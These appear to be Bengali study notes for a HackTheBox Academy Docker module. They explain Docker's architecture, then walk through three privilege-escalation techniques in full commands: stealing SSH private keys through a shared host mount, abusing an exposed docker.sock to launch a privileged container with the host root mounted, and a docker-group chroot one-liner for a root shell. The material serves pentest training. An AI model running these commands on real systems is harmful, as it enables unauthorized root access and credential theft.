# Docker - [LINK](https://academy.hackthebox.com/app/module/51/section/2411)


সফটওয়্যার ডেভেলপমেন্ট এবং ডেপলয়মেন্টের দুনিয়ায় **Docker** একটি অত্যন্ত জনপ্রিয় ওপেন-সোর্স টুল। পেনিট্রেশন টেস্টিংয়ের সময় আমরা প্রায়ই এমন সিস্টেমের দেখা পাই, যেখানে ডকার চলছে। ডকারের কিছু সাধারণ কনফিগারেশন ত্রুটি কাজে লাগিয়ে খুব সহজেই সিস্টেমের রুট (Root) অ্যাক্সেস নেওয়া যায়।


## ১. Docker আসলে কী? (What is Docker?)

সাধারণ ভার্চুয়াল মেশিন (VM) হার্ডওয়্যার লেভেলে কাজ করে এবং প্রতিটি VM-এর জন্য আলাদা অপারেটিং সিস্টেম লাগে। কিন্তু ডকার **কন্টেইনার (Container)** ব্যবহার করে, যা অপারেটিং সিস্টেম লেভেলে কাজ করে। কন্টেইনারগুলো হোস্ট মেশিনের অপারেটিং সিস্টেম শেয়ার করে, কিন্তু নিজেদের প্রসেসগুলোকে সম্পূর্ণ আলাদা (Isolate) রাখে। ফলে এগুলো ভার্চুয়াল মেশিনের চেয়ে অনেক কম রিসোর্স বা র‍্যাম/সিপিইউ ব্যবহার করে।

### ডকার আর্কিটেকচার (Docker Architecture)

ডকার মূলত ক্লায়েন্ট-সার্ভার মডেল অনুসরণ করে কাজ করে। এর প্রধান দুটি অংশ হলো:

* **Docker Daemon (ডকার ডেমন/সার্ভার):** এটি হলো ডকারের মূল ইঞ্জিন। এটি ব্যাকগ্রাউন্ডে চলে এবং কন্টেইনার তৈরি করা, চালানো, মনিটর করা, নেটওয়ার্কিং এবং স্টোরেজ (ভলিউম) ম্যানেজ করার মতো সব কাজ করে। এটি ডকার হাব (Docker Hub) থেকে ইমেজ ডাউনলোড করে এবং লোকালি সেভ করে।
* **Docker Client (ডকার ক্লায়েন্ট):** এটি হলো ইউজার ইন্টারফেস (যেমন টার্মিনালে `docker` কমান্ড)। আমরা ক্লায়েন্টের মাধ্যমে কমান্ড দিই, আর ক্লায়েন্ট ডকার ডেমনের সাথে কথা বলে (API বা Unix সকেটের মাধ্যমে) সেই কাজগুলো করিয়ে নেয়।

এছাড়াও **Docker Compose** নামে একটি টুল আছে, যা দিয়ে YAML ফাইলের মাধ্যমে একসাথে অনেকগুলো কন্টেইনার ম্যানেজ করা যায়। আর **Docker Desktop** হলো ম্যাক বা উইন্ডোজের জন্য ডকারের গ্রাফিকাল ইন্টারফেস (GUI)।

### ডকার ইমেজ এবং কন্টেইনার (Images vs Containers)

* **Docker Image:** ইমেজ হলো কন্টেইনার তৈরির ব্লুপ্রিন্ট বা টেমপ্লেট। একটি অ্যাপ চালানোর জন্য যা যা লাগে (কোড, লাইব্রেরি, ডিপেনডেন্সি), তার সবকিছু ইমেজের ভেতর থাকে। এটি একটি "Read-only" বা অপরিবর্তনযোগ্য প্যাকেজ। এটি **Dockerfile** নামের একটি টেক্সট ফাইল দিয়ে বানানো হয়।
* **Docker Container:** কন্টেইনার হলো একটি ইমেজের জীবন্ত বা চলমান রূপ (Instance)। যখন আমরা কোনো ইমেজ রান করি, তখন সেটি কন্টেইনারে পরিণত হয়। কন্টেইনারের ভেতরে পরিবর্তন (Mutable) করা যায়, কিন্তু সেটি সেভ না করলে কন্টেইনার ডিলিট হওয়ার সাথে সাথে সব ডেটা মুছে যায়।

## ২. Docker Privilege Escalation (ডকার দিয়ে রুট অ্যাক্সেস নেওয়া)

যদি আমরা এমন কোনো সিস্টেমে অ্যাক্সেস পাই যেখানে ডকার চলছে, তবে আমরা কয়েকটি নির্দিষ্ট পদ্ধতি ব্যবহার করে পুরো হোস্ট সিস্টেমের রুট পারমিশন নিতে পারি।

### পদ্ধতি ১: Docker Shared Directories (শেয়ার্ড ডিরেক্টরির অপব্যবহার)

ডকারে "Volume Mount" বা শেয়ার্ড ডিরেক্টরি ব্যবহার করে হোস্ট সিস্টেমের কোনো ফোল্ডারকে কন্টেইনারের ভেতরে অ্যাক্সেসযোগ্য করা যায়। এর উদ্দেশ্য হলো ডেটা সেভ রাখা বা কোড শেয়ার করা। কিন্তু অ্যাডমিনরা যদি ভুল করে হোস্ট সিস্টেমের কোনো গুরুত্বপূর্ণ ফোল্ডার (যেমন `/home` বা `/`) কন্টেইনারের সাথে শেয়ার করে রাখেন, তবে সেটি হ্যাকারদের জন্য বিশাল সুযোগ।

ধরা যাক, আমরা একটি কন্টেইনারের ভেতর অ্যাক্সেস পেয়েছি এবং দেখলাম সেখানে `/hostsystem` নামে একটি ফোল্ডার আছে, যা আসলে হোস্ট মেশিনের ফোল্ডার।

**অ্যাটাক পদ্ধতি:**

```bash
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

```

এখানে আমরা হোস্ট মেশিনের `cry0l1t3` ইউজারের ফাইলগুলো দেখতে পাচ্ছি। আমরা তার লুকানো `.ssh` ফোল্ডারে গিয়ে তার প্রাইভেট কি (Private Key) চুরি করতে পারি:

```bash
root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

```

এই `id_rsa` কি-টি কপি করে আমরা আমাদের অ্যাটাকিং মেশিনে `cry0l1t3.priv` নামে সেভ করে সরাসরি হোস্ট মেশিনে SSH করতে পারি:

```bash
00Luffy00@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv

```

### পদ্ধতি ২: Docker Sockets (ডকার সকেট হ্যাকিং)

`docker.sock` হলো একটি বিশেষ ফাইল যার মাধ্যমে ডকার ক্লায়েন্ট ডকার ডেমনের সাথে কথা বলে। সাধারণত এটি `/var/run/docker.sock` এ থাকে। যদি আমরা কন্টেইনারের ভেতর বা হোস্ট মেশিনে এমন অবস্থায় থাকি যেখানে আমাদের এই সকেট ফাইলটি রিড/রাইট করার পারমিশন আছে, তবে আমরা সিস্টেম হ্যাক করতে পারি।

ধরা যাক, কন্টেইনারের ভেতর `/app` ফোল্ডারে আমরা `docker.sock` পেয়েছি। আমরা প্রথমে ডকার বাইনারি ফাইলটি ডাউনলোড করে কন্টেইনারে আনব এবং সেটি দিয়ে সকেটের সাথে কথা বলব:

```bash
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker

```

এখন আমরা এই সকেট ব্যবহার করে নতুন একটি প্রিভিলেজড (Privileged) কন্টেইনার তৈরি করব এবং হোস্ট মেশিনের রুট ডিরেক্টরি (`/`) কে কন্টেইনারের `/hostsystem` এ মাউন্ট করে দেব:

```bash
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

```

এবার আমরা `ps` কমান্ড দিয়ে নতুন তৈরি হওয়া কন্টেইনারের আইডি (যেমন `7ae3bcc818af`) বের করে তার ভেতরে একটি শেল ওপেন করব:

```bash
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

```

এখন আমরা নতুন কন্টেইনারের ভেতরে রুট ইউজার হিসেবে আছি। `cat /hostsystem/root/.ssh/id_rsa` কমান্ড দিলেই আমরা হোস্ট মেশিনের আসল রুট ইউজারের প্রাইভেট কি পেয়ে যাব এবং পুরো সিস্টেমের কন্ট্রোল নিতে পারব।

### পদ্ধতি ৩: Docker Group (ডকার গ্রুপ এবং কমান্ড অ্যাটাক)

লিনাক্সে কোনো ইউজারকে `docker` গ্রুপে যুক্ত করা আর তাকে পাসওয়ার্ড ছাড়াই রুট (Root) অ্যাক্সেস দেওয়া একদম একই কথা।

আমরা যদি হোস্ট মেশিনে থাকি এবং দেখি যে আমাদের বর্তমান ইউজার `docker` গ্রুপের মেম্বার:

```bash
docker-user@nix02:~$ id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)

```

তাহলে আমরা একটি মাত্র কমান্ড দিয়ে পুরো সিস্টেমের রুট হয়ে যেতে পারি। কমান্ডটি হলো:

```bash
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

```

**কমান্ডের সহজ ব্যাখ্যা:**

* `run -v /:/mnt`: নতুন একটি উবুন্টু কন্টেইনার চালাও এবং হোস্ট মেশিনের আসল রুট (`/`) ফোল্ডারটিকে কন্টেইনারের `/mnt` ফোল্ডারে মাউন্ট করো।
* `chroot /mnt bash`: কন্টেইনার চালু হওয়ার সাথে সাথে এর রুট ডিরেক্টরি পরিবর্তন করে `/mnt` (যা আসলে হোস্টের রুট) করে দাও এবং একটি ব্যাশ শেল ওপেন করো।

এই কমান্ডটি এন্টার দেওয়ার সাথে সাথেই আপনি হোস্ট মেশিনের আসল ফাইল সিস্টেমের রুট শেল (Root Shell) পেয়ে যাবেন!
